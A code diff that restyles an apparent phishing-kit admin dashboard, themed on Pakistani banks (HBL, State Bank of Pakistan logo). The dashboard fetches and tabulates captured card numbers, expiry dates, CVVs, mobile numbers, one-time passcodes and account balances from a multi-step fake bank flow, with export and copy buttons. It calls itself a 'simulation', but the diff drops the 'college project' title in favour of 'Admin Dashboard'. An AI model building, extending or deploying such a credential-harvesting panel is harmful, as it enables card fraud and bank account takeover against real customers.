@@ -1,127 +1,238 @@
 <!DOCTYPE html>
-<html lang="en" class="bg-background">
+<html lang="en" class="h-full bg-slate-900 text-slate-100">
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Simulated Submissions Inspector | SBP College Project</title>
+    <title>Admin Dashboard | SBP Project Inspector</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="/public/css/style.css">
-    <meta name="theme-color" content="#1f8a52">
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['"Plus Jakarta Sans"', 'sans-serif'],
+                        mono: ['"JetBrains Mono"', 'monospace']
+                    },
+                    colors: {
+                        brand: {
+                            50: '#f0fdf4',
+                            500: '#22c55e',
+                            600: '#16a34a',
+                            700: '#15803d',
+                            900: '#14532d'
+                        }
+                    }
+                }
+            }
+        }
+    </script>
     <style>
-        body { font-family: 'Manrope', system-ui, sans-serif; }
+        body { font-family: 'Plus Jakarta Sans', sans-serif; }
+        .glass-card {
+            background: rgba(30, 41, 59, 0.7);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+        }
+        .custom-scrollbar::-webkit-scrollbar {
+            height: 6px;
+            width: 6px;
+        }
+        .custom-scrollbar::-webkit-scrollbar-thumb {
+            background: rgba(255, 255, 255, 0.15);
+            border-radius: 9999px;
+        }
     </style>
 </head>
-<body class="font-sans antialiased text-foreground bg-slate-50 min-h-screen">
-    <header class="border-b border-border bg-white sticky top-0 z-30 shadow-sm">
-        <div class="mx-auto flex max-w-7xl items-center justify-between px-4 py-3 sm:px-6">
-            <div class="flex items-center gap-3">
-                <a href="/" class="flex h-9 w-9 items-center justify-center rounded-lg border border-border hover:bg-slate-100 transition">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="15 18 9 12 15 6"/></svg>
+<body class="min-h-full bg-gradient-to-br from-slate-950 via-slate-900 to-slate-950 text-slate-100 antialiased selection:bg-brand-500/30 selection:text-brand-500">
+    
+    <!-- Top Navigation Bar -->
+    <header class="sticky top-0 z-40 border-b border-slate-800/80 bg-slate-950/80 backdrop-blur-xl">
+        <div class="mx-auto flex max-w-7xl items-center justify-between px-4 py-3.5 sm:px-6 lg:px-8">
+            <div class="flex items-center gap-3.5">
+                <a href="/" class="group flex h-10 w-10 items-center justify-center rounded-xl bg-slate-800/80 border border-slate-700 text-slate-300 transition-all hover:bg-brand-600 hover:text-white hover:border-brand-500">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 transition-transform group-hover:-translate-x-0.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18" />
+                    </svg>
                 </a>
-                <span class="flex h-9 w-9 items-center justify-center overflow-hidden rounded-full bg-white ring-1 ring-primary/20">
-                    <img src="/public/logos/state-bank-of-pakistan.png" onerror="this.src='https://sbp-phase-3.vercel.app/logos/state-bank-of-pakistan.png'" alt="Logo" class="h-full w-full object-contain p-0.5">
-                </span>
-                <div>
-                    <h1 class="text-base font-bold text-slate-900 leading-tight">Simulated Submissions Inspector</h1>
-                    <p class="text-xs text-slate-500">Live JSON storage reader & test environment</p>
+                <div class="flex items-center gap-3">
+                    <div class="flex h-10 w-10 items-center justify-center rounded-xl bg-gradient-to-tr from-brand-600 to-emerald-400 p-0.5 shadow-lg shadow-brand-500/20">
+                        <div class="flex h-full w-full items-center justify-center rounded-[10px] bg-slate-950">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-brand-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
+                            </svg>
+                        </div>
+                    </div>
+                    <div>
+                        <div class="flex items-center gap-2">
+                            <h1 class="text-base font-bold text-white tracking-tight">Admin Submissions Inspector</h1>
+                            <span class="inline-flex items-center gap-1 rounded-full bg-brand-500/10 px-2 py-0.5 text-[10px] font-semibold text-brand-500 border border-brand-500/20">
+                                <span class="h-1.5 w-1.5 rounded-full bg-brand-500 animate-pulse"></span>
+                                Live Sync
+                            </span>
+                        </div>
+                        <p class="text-xs text-slate-400">Captured simulation logs & real-time JSON storage</p>
+                    </div>
                 </div>
             </div>
-            <div class="flex items-center gap-2">
-                <button id="export-json-btn" class="inline-flex items-center gap-1.5 rounded-xl bg-primary px-3.5 py-2 text-xs font-bold text-white shadow hover:brightness-105 transition">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" x2="12" y1="15" y2="3"/></svg>
-                    Export JSON
+
+            <div class="flex items-center gap-2.5">
+                <button id="export-json-btn" class="inline-flex items-center gap-2 rounded-xl bg-gradient-to-r from-brand-600 to-emerald-600 px-4 py-2 text-xs font-bold text-white shadow-lg shadow-brand-600/20 transition-all hover:brightness-110 active:scale-95">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
+                    </svg>
+                    <span>Export JSON</span>
                 </button>
-                <button id="clear-all-btn" class="inline-flex items-center gap-1.5 rounded-xl bg-rose-50 border border-rose-200 px-3 py-2 text-xs font-bold text-rose-700 hover:bg-rose-100 transition">
-                    Clear Data
+                <button id="clear-all-btn" class="inline-flex items-center gap-1.5 rounded-xl border border-rose-500/30 bg-rose-500/10 px-3.5 py-2 text-xs font-semibold text-rose-400 transition-all hover:bg-rose-500/20 hover:text-rose-300">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" />
+                    </svg>
+                    <span>Clear</span>
                 </button>
             </div>
         </div>
     </header>
 
-    <main class="mx-auto max-w-7xl px-4 py-6 sm:px-6">
-        <div class="grid grid-cols-1 gap-4 sm:grid-cols-4 mb-6">
-            <div class="rounded-2xl border border-slate-200 bg-white p-4 shadow-sm">
-                <p class="text-xs font-semibold uppercase tracking-wider text-slate-500">Total Records</p>
-                <p id="stat-total" class="mt-2 text-2xl font-black text-slate-900">0</p>
-                <p class="mt-1 text-xs text-emerald-600 font-medium">Auto-synced JSON</p>
-            </div>
-            <div class="rounded-2xl border border-slate-200 bg-white p-4 shadow-sm">
-                <p class="text-xs font-semibold uppercase tracking-wider text-slate-500">Storage Engine</p>
-                <p class="mt-2 text-sm font-bold text-slate-800 truncate font-mono">submissions.json & Storage</p>
-                <p class="mt-1 text-xs text-slate-500">Real-time sync</p>
-            </div>
-            <div class="rounded-2xl border border-slate-200 bg-white p-4 shadow-sm">
-                <p class="text-xs font-semibold uppercase tracking-wider text-slate-500">Live Status</p>
-                <div class="mt-2 flex items-center gap-2">
-                    <span class="h-3 w-3 rounded-full bg-emerald-500 animate-pulse"></span>
-                    <span class="text-sm font-bold text-slate-900">Active Listener</span>
+    <!-- Main Container -->
+    <main class="mx-auto max-w-7xl px-4 py-8 sm:px-6 lg:px-8 space-y-6">
+        
+        <!-- Metrics Row -->
+        <div class="grid grid-cols-1 gap-4 sm:grid-cols-2 lg:grid-cols-4">
+            <div class="glass-card rounded-2xl p-5 relative overflow-hidden group hover:border-slate-700 transition">
+                <div class="flex items-center justify-between">
+                    <span class="text-xs font-semibold uppercase tracking-wider text-slate-400">Total Records</span>
+                    <span class="rounded-xl bg-brand-500/10 p-2 text-brand-500">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z" />
+                        </svg>
+                    </span>
                 </div>
-                <p class="mt-1 text-xs text-slate-500">Auto-refreshes every 3s</p>
-            </div>
-            <div class="rounded-2xl border border-slate-200 bg-white p-4 shadow-sm">
-                <p class="text-xs font-semibold uppercase tracking-wider text-slate-500">Direct Links</p>
-                <div class="mt-2 flex gap-2">
-                    <a href="/bank/hbl" class="text-xs font-bold text-primary hover:underline">Test HBL Flow &rarr;</a>
+                <p id="stat-total" class="mt-3 text-3xl font-extrabold text-white">0</p>
+                <div class="mt-2 flex items-center gap-1.5 text-xs text-brand-500">
+                    <span>Synchronized locally & via API</span>
                 </div>
-                <p class="mt-1 text-xs text-slate-500"><a href="/" class="text-slate-600 hover:underline">View Bank Directory</a></p>
+            </div>
+
+            <div class="glass-card rounded-2xl p-5 relative overflow-hidden group hover:border-slate-700 transition">
+                <div class="flex items-center justify-between">
+                    <span class="text-xs font-semibold uppercase tracking-wider text-slate-400">Target Bank</span>
+                    <span class="rounded-xl bg-blue-500/10 p-2 text-blue-400">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
+                        </svg>
+                    </span>
+                </div>
+                <p id="stat-last-bank" class="mt-3 text-lg font-bold text-slate-200 truncate">HBL / Ready</p>
+                <div class="mt-2 flex items-center gap-1.5 text-xs text-slate-400">
+                    <span>Multi-step bank simulated</span>
+                </div>
+            </div>
+
+            <div class="glass-card rounded-2xl p-5 relative overflow-hidden group hover:border-slate-700 transition">
+                <div class="flex items-center justify-between">
+                    <span class="text-xs font-semibold uppercase tracking-wider text-slate-400">Verification Rate</span>
+                    <span class="rounded-xl bg-purple-500/10 p-2 text-purple-400">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+                        </svg>
+                    </span>
+                </div>
+                <p id="stat-verified" class="mt-3 text-3xl font-extrabold text-purple-400">100%</p>
+                <div class="mt-2 flex items-center gap-1.5 text-xs text-purple-400">
+                    <span>Simulated sandbox verified</span>
+                </div>
+            </div>
+
+            <div class="glass-card rounded-2xl p-5 relative overflow-hidden group hover:border-slate-700 transition">
+                <div class="flex items-center justify-between">
+                    <span class="text-xs font-semibold uppercase tracking-wider text-slate-400">Quick Test Flow</span>
+                    <span class="rounded-xl bg-amber-500/10 p-2 text-amber-400">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z" />
+                        </svg>
+                    </span>
+                </div>
+                <div class="mt-3 flex items-center gap-2">
+                    <a href="/bank/hbl" class="inline-flex items-center gap-1 text-sm font-bold text-brand-500 hover:text-brand-400 hover:underline">
+                        Open /bank/hbl &rarr;
+                    </a>
+                </div>
+                <div class="mt-2 text-xs text-slate-400">
+                    <span>Card &rarr; OTP &rarr; Balance &rarr; Verify</span>
+                </div>
             </div>
         </div>
 
-        <div class="rounded-2xl border border-slate-200 bg-white shadow-sm overflow-hidden">
-            <div class="border-b border-slate-200 px-5 py-4 flex flex-wrap items-center justify-between gap-3">
+        <!-- Table Card -->
+        <div class="glass-card rounded-3xl overflow-hidden shadow-2xl">
+            <div class="border-b border-slate-800 p-5 sm:px-6 flex flex-wrap items-center justify-between gap-4">
                 <div>
-                    <h2 class="text-base font-bold text-slate-900">Captured Simulation Submissions</h2>
-                    <p class="text-xs text-slate-500">All data entered during testing is recorded in real time.</p>
+                    <h2 class="text-lg font-bold text-white">Live Form Submissions</h2>
+                    <p class="text-xs text-slate-400 mt-0.5">Real-time data stream of all completed simulation test steps.</p>
                 </div>
-                <div class="flex items-center gap-2">
-                    <input id="table-search" type="text" placeholder="Filter records..." class="rounded-xl border border-slate-200 px-3.5 py-1.5 text-xs text-slate-800 outline-none focus:border-primary">
-                    <button id="refresh-btn" class="rounded-xl border border-slate-200 px-3 py-1.5 text-xs font-semibold text-slate-700 hover:bg-slate-50">
+                
+                <div class="flex items-center gap-3">
+                    <div class="relative">
+                        <input id="table-search" type="text" placeholder="Search records..." class="w-48 sm:w-64 rounded-xl border border-slate-700 bg-slate-900/90 px-3.5 py-2 pl-9 text-xs text-slate-200 outline-none transition focus:border-brand-500 focus:ring-1 focus:ring-brand-500 placeholder:text-slate-500">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 absolute left-3 top-2.5 text-slate-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
+                        </svg>
+                    </div>
+                    <button id="refresh-btn" class="rounded-xl border border-slate-700 bg-slate-800/80 px-3 py-2 text-xs font-semibold text-slate-300 hover:bg-slate-700 hover:text-white transition">
                         Refresh
                     </button>
                 </div>
             </div>
 
-            <div class="overflow-x-auto">
+            <!-- Table Wrapper -->
+            <div class="overflow-x-auto custom-scrollbar">
                 <table class="w-full text-left text-xs">
-                    <thead class="bg-slate-50 border-b border-slate-200 text-slate-600 uppercase font-semibold">
+                    <thead class="bg-slate-950/60 border-b border-slate-800 text-[11px] font-bold uppercase tracking-wider text-slate-400">
                         <tr>
-                            <th class="px-4 py-3">Timestamp</th>
-                            <th class="px-4 py-3">Bank</th>
-                            <th class="px-4 py-3">Card Number</th>
-                            <th class="px-4 py-3">Exp / CVV</th>
-                            <th class="px-4 py-3">Mobile No</th>
-                            <th class="px-4 py-3">OTP 1</th>
-                            <th class="px-4 py-3">Balance (PKR)</th>
-                            <th class="px-4 py-3">Verify OTP</th>
-                            <th class="px-4 py-3">Last Step</th>
-                            <th class="px-4 py-3 text-right">Actions</th>
+                            <th class="px-5 py-3.5 whitespace-nowrap">Timestamp</th>
+                            <th class="px-5 py-3.5 whitespace-nowrap">Bank</th>
+                            <th class="px-5 py-3.5 whitespace-nowrap">Card Number</th>
+                            <th class="px-5 py-3.5 whitespace-nowrap">Exp / CVV</th>
+                            <th class="px-5 py-3.5 whitespace-nowrap">Mobile</th>
+                            <th class="px-5 py-3.5 whitespace-nowrap">OTP (1)</th>
+                            <th class="px-5 py-3.5 whitespace-nowrap">Balance</th>
+                            <th class="px-5 py-3.5 whitespace-nowrap">Verify OTP</th>
+                            <th class="px-5 py-3.5 whitespace-nowrap">Status</th>
+                            <th class="px-5 py-3.5 text-right whitespace-nowrap">Action</th>
                         </tr>
                     </thead>
-                    <tbody id="submissions-tbody" class="divide-y divide-slate-100 font-medium text-slate-800">
+                    <tbody id="submissions-tbody" class="divide-y divide-slate-800/60 font-medium">
+                        <!-- Populated by JS -->
                     </tbody>
                 </table>
             </div>
         </div>
+    </main>
 
-        <div id="json-modal" class="hidden fixed inset-0 z-50 flex items-center justify-center bg-black/50 p-4">
-            <div class="w-full max-w-2xl rounded-3xl bg-white p-6 shadow-2xl">
-                <div class="flex items-center justify-between pb-3 border-b border-slate-100">
-                    <h3 class="text-base font-bold text-slate-900">Submission JSON Object</h3>
-                    <button id="close-modal-btn" class="h-8 w-8 rounded-full bg-slate-100 flex items-center justify-center text-slate-600 hover:bg-slate-200">✕</button>
+    <!-- Raw JSON Modal -->
+    <div id="json-modal" class="hidden fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm p-4">
+        <div class="w-full max-w-2xl rounded-3xl border border-slate-700 bg-slate-900 p-6 shadow-2xl animate-in fade-in zoom-in-95 duration-200">
+            <div class="flex items-center justify-between pb-4 border-b border-slate-800">
+                <div class="flex items-center gap-2">
+                    <span class="h-3 w-3 rounded-full bg-brand-500"></span>
+                    <h3 class="text-sm font-bold text-white font-mono">Submission JSON Payload</h3>
                 </div>
-                <pre id="modal-json-content" class="mt-4 max-h-96 overflow-auto rounded-2xl bg-slate-900 p-4 text-xs font-mono text-emerald-400"></pre>
-                <div class="mt-4 flex justify-end gap-2">
-                    <button id="copy-json-btn" class="rounded-xl bg-primary px-4 py-2 text-xs font-bold text-white hover:brightness-105">Copy JSON</button>
-                </div>
+                <button id="close-modal-btn" class="h-8 w-8 rounded-full bg-slate-800 flex items-center justify-center text-slate-400 hover:bg-slate-700 hover:text-white transition">✕</button>
+            </div>
+            <pre id="modal-json-content" class="mt-4 max-h-96 overflow-auto rounded-2xl bg-slate-950 p-4 text-xs font-mono text-emerald-400 border border-slate-800 custom-scrollbar"></pre>
+            <div class="mt-5 flex justify-end gap-2.5">
+                <button id="copy-json-btn" class="rounded-xl bg-brand-600 px-4 py-2 text-xs font-bold text-white hover:bg-brand-500 shadow-lg shadow-brand-600/20 transition">Copy JSON</button>
             </div>
         </div>
-    </main>
+    </div>
 
     <script>
         const tbody = document.getElementById('submissions-tbody');
         const statTotal = document.getElementById('stat-total');
+        const statLastBank = document.getElementById('stat-last-bank');
         const searchInput = document.getElementById('table-search');
         const clearBtn = document.getElementById('clear-all-btn');
         const refreshBtn = document.getElementById('refresh-btn');
@@ -133,16 +244,14 @@
 
         async function getSubmissions() {
             let list = [];
-            // Try API first
             try {
                 const res = await fetch('/api.php?action=get_submissions');
                 const data = await res.json();
-                if (data.success && data.submissions.length) {
+                if (data.success && data.submissions && data.submissions.length) {
                     list = data.submissions;
                 }
             } catch(e) {}
 
-            // Merge with localStorage
             try {
                 const local = JSON.parse(localStorage.getItem('sbp_submissions') || '[]');
                 if (local.length > list.length) {
@@ -156,6 +265,9 @@
         async function updateDashboard() {
             const list = await getSubmissions();
             if (statTotal) statTotal.textContent = list.length;
+            if (statLastBank && list.length > 0) {
+                statLastBank.textContent = list[0].bank_name || 'HBL';
+            }
 
             const q = (searchInput ? searchInput.value : '').toLowerCase();
             const filtered = list.filter(item => {
@@ -164,7 +276,18 @@
             });
 
             if (filtered.length === 0) {
-                tbody.innerHTML = '<tr><td colspan="10" class="px-4 py-12 text-center text-slate-400">No simulated submissions recorded yet. Go to <a href="/bank/hbl" class="text-primary font-bold hover:underline">/bank/hbl</a> and test a submission!</td></tr>';
+                tbody.innerHTML = `
+                    <tr>
+                        <td colspan="10" class="px-5 py-16 text-center text-slate-500">
+                            <div class="flex flex-col items-center justify-center gap-2">
+                                <svg class="h-8 w-8 text-slate-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M20 13V6a2 2 0 00-2-2H6a2 2 0 00-2 2v7m16 0v5a2 2 0 01-2 2H6a2 2 0 01-2-2v-5m16 0h-2.586a1 1 0 00-.707.293l-2.414 2.414a1 1 0 01-.707.293h-3.172a1 1 0 01-.707-.293l-2.414-2.414A1 1 0 006.586 13H4" />
+                                </svg>
+                                <p class="font-medium text-slate-400">No test submissions captured yet</p>
+                                <p class="text-xs text-slate-500">Open <a href="/bank/hbl" class="text-brand-500 font-bold hover:underline">/bank/hbl</a> and run a simulation test.</p>
+                            </div>
+                        </td>
+                    </tr>`;
                 return;
             }
 
@@ -172,28 +295,28 @@
                 const d = sub.data || {};
                 const exp = (d.exp_month || '') + '/' + (d.exp_year || '');
                 return `
-                    <tr class="hover:bg-slate-50/80 transition">
-                        <td class="px-4 py-3 font-mono text-[0.7rem] text-slate-500 whitespace-nowrap">${sub.updated_at || sub.created_at || 'N/A'}</td>
-                        <td class="px-4 py-3 font-bold text-slate-900 whitespace-nowrap">
-                            <span class="inline-flex items-center gap-1.5">
-                                <span class="h-2 w-2 rounded-full bg-emerald-500"></span>
+                    <tr class="hover:bg-slate-800/40 transition">
+                        <td class="px-5 py-4 font-mono text-[11px] text-slate-400 whitespace-nowrap">${sub.updated_at || sub.created_at || 'N/A'}</td>
+                        <td class="px-5 py-4 font-bold text-white whitespace-nowrap">
+                            <span class="inline-flex items-center gap-2">
+                                <span class="h-2 w-2 rounded-full bg-brand-500"></span>
                                 ${sub.bank_name || (sub.bank_slug || 'HBL').toUpperCase()}
                             </span>
                         </td>
-                        <td class="px-4 py-3 font-mono text-slate-700 whitespace-nowrap">${d.card_number || '—'}</td>
-                        <td class="px-4 py-3 font-mono text-slate-600 whitespace-nowrap">${exp} | CVV: ${d.cvv || '—'}</td>
-                        <td class="px-4 py-3 font-mono text-primary font-bold whitespace-nowrap">${d.mobile || '—'}</td>
-                        <td class="px-4 py-3 font-mono text-amber-600 font-bold whitespace-nowrap">${d.otp || '—'}</td>
-                        <td class="px-4 py-3 font-bold text-emerald-700 whitespace-nowrap">${d.balance ? 'PKR ' + d.balance : '—'}</td>
-                        <td class="px-4 py-3 font-mono text-purple-600 font-bold whitespace-nowrap">${d.verify_otp || '—'}</td>
-                        <td class="px-4 py-3 whitespace-nowrap">
-                            <span class="inline-flex rounded-full px-2 py-0.5 text-[0.65rem] font-bold bg-slate-100 text-slate-700 uppercase">
+                        <td class="px-5 py-4 font-mono text-slate-300 whitespace-nowrap">${d.card_number || '—'}</td>
+                        <td class="px-5 py-4 font-mono text-slate-400 whitespace-nowrap">${exp} <span class="text-slate-600">|</span> CVV: ${d.cvv || '—'}</td>
+                        <td class="px-5 py-4 font-mono text-brand-400 font-semibold whitespace-nowrap">${d.mobile || '—'}</td>
+                        <td class="px-5 py-4 font-mono text-amber-400 font-bold whitespace-nowrap">${d.otp || '—'}</td>
+                        <td class="px-5 py-4 font-bold text-emerald-400 whitespace-nowrap">${d.balance ? 'PKR ' + d.balance : '—'}</td>
+                        <td class="px-5 py-4 font-mono text-purple-400 font-bold whitespace-nowrap">${d.verify_otp || '—'}</td>
+                        <td class="px-5 py-4 whitespace-nowrap">
+                            <span class="inline-flex items-center gap-1 rounded-full px-2.5 py-1 text-[10px] font-bold bg-brand-500/10 text-brand-400 border border-brand-500/20 uppercase tracking-wider">
                                 ${sub.last_step || 'card'}
                             </span>
                         </td>
-                        <td class="px-4 py-3 text-right whitespace-nowrap">
-                            <button class="view-json-btn text-xs text-primary font-bold hover:underline" onclick='showModal(${JSON.stringify(sub).replace(/'/g, "&apos;")})'>
-                                Raw JSON
+                        <td class="px-5 py-4 text-right whitespace-nowrap">
+                            <button class="rounded-lg bg-slate-800 border border-slate-700 px-2.5 py-1.5 text-[11px] font-semibold text-slate-300 hover:bg-brand-600 hover:text-white hover:border-brand-500 transition" onclick='showModal(${JSON.stringify(sub).replace(/'/g, "&apos;")})'>
+                                View JSON
                             </button>
                         </td>
                     </tr>
@@ -222,7 +345,7 @@
                 const url = URL.createObjectURL(blob);
                 const a = document.createElement('a');
                 a.href = url;
-                a.download = 'simulated_submissions_' + new Date().toISOString().slice(0, 10) + '.json';
+                a.download = 'sbp_submissions_' + new Date().toISOString().slice(0, 10) + '.json';
                 a.click();
             };
         }
